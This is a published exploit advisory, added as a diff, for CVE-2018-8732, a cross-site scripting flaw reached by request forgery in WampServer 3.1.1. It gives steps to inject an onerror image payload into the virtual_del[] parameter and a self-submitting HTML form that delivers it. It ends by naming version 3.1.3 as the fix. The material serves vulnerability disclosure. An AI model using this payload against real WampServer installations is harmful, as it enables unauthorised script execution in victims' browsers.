@@ -1,0 +1,51 @@
+ # Exploit Title: WampServer 3.1.1 XSS via CSRF
+# Date: 31-03-2018
+# Software Link: http://www.wampserver.com/en/
+# Version: 3.1.1
+# Tested On: Windows 10
+# Exploit Author: Vipin Chaudhary
+# Contact: http://twitter.com/vipinxsec
+# Website: http://medium.com/@vipinxsec
+# CVE: CVE-2018-8732
+
+
+1. Description
+
+XSS: cross site scripting via CSRF is remotely exploitable.
+http://forum.wampserver.com/read.php?2,138295,150615,page=6#msg-150615
+
+http://forum.wampserver.com/read.php?2,150617
+
+2. Proof of Concept
+
+
+How to exploit this XSS vulnerability:
+1. Go to Add a Virtual host and add one to wampserver.
+2. Go to Supress Virtual host and select one to delete and then intercept
+the request using burp suite or any other proxy tool
+3. Change the value of parameter *virtual_del[] *to "><img src=x
+onerror=alert(1)> and forward it then you will see the XSS triggered.
+
+How to see it:
+1. Copy and paste this CSRF request in notepad and save it as anything.html
+<html>
+  <body onload="wamp_csrf.submit();">
+    <form action="[localhost]; name="wamp_csrf" method="POST">
+      <input type="hidden" name="virtual&#95;del&#91;&#93;"
+value=""><img&#32;src&#61;x&#32;onerror&#61;alert&#40;1&#41;>"
+/>
+      <input type="hidden" name="vhostdelete"
+value="Suppress&#32;VirtualHost" />
+    </form>
+  </body>
+</html>
+
+Warning: action="[localhost] is action='
+http://localhost/add_vhost.php?lang=english' replacing simple quotes(') by
+double quote("[image: winking smiley]
+
+
+3. Solution:
+
+Update to version 3.1.3
+http://www.wampserver.com/en/#download-wrapper
